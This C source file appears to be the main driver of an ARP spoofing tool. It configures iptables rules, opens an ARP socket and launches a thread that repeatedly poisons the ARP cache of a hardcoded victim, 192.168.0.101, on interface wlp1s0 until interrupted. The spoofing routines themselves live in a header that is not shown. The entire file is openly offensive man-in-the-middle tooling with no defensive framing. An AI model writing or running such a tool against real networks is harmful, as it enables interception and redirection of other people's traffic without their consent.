#include "core.h"
#include <pthread.h>
#include <signal.h>

int ARP_SOCK = -1;
pthread_t ARP_SPOOF_TID = -1;
ARPSpoofArgs ARP_SPOOF_ARGS = {0};

void sigint_handler(int sig) {
    ARP_SPOOF_ARGS.is_terminated = 1;
}

void main(void) {
    reset_iptables();
    set_iptables();
    signal(SIGINT, sigint_handler);

    char* if_name = "wlp1s0";
    char* victim_addr_str = "192.168.0.101";
    int spoof_period_sec = 1;
    ARP_SOCK = get_arp_socket();

    init_arp_spoof_args(
        &ARP_SPOOF_ARGS,
        if_name,
        ARP_SOCK,
        victim_addr_str,
        spoof_period_sec
    );
    printf("ARP spoof args:\n");
    print_arp_spoof_args(&ARP_SPOOF_ARGS);

    if (pthread_create(
            &ARP_SPOOF_TID, NULL, start_arp_spoof, (void*)&ARP_SPOOF_ARGS
        )
        != 0) {
        fprintf(
            stderr, "ERROR: Failed to create start_arp_spoof thread\n"
        );
        exit(1);
    }

    pthread_join(ARP_SPOOF_TID, NULL);
    close(ARP_SOCK);
    reset_iptables();
    exit(0);
}
